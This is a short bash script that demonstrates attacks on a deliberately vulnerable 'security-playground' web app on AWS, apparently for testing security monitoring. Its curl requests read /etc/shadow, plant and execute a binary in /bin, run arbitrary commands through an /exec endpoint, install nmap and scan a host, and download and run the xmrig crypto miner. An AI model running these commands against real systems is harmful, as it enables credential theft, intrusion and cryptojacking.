#!/bin/bash
# Script to demonstrate how to interact with security-playground

REGION="ap-southeast-2"
LB_ADDR=$(aws cloudformation list-exports --region $REGION --query "Exports[?Name=='SPALBAddress'].Value" --output text)

echo "1. Exploit reading our /etc/shadow file and sending it back to us"
curl $LB_ADDR/etc/shadow

echo "2. Exploit writing to /bin"
curl -X POST $LB_ADDR/bin/hello -d 'content=echo "hello-world"'
echo ""
echo "and then set it to be executable"
curl -X POST $LB_ADDR/exec -d 'command=chmod 0755 /bin/hello'
echo "and then run it"
curl -X POST $LB_ADDR/exec -d 'command=hello'

echo "3. Exploit installing nmap and running a scan"
curl -X POST $LB_ADDR/exec -d 'command=apt-get update; apt-get -y install nmap;nmap -v scanme.nmap.org'

echo "4. Exploit downloading then running a crypto miner"
curl -X POST $LB_ADDR/exec -d 'command=wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz -O xmrig.tar.gz'
curl -X POST $LB_ADDR/exec -d 'command=tar -xzvf xmrig.tar.gz'
curl -X POST $LB_ADDR/exec -d 'command=/app/xmrig-6.18.1/xmrig'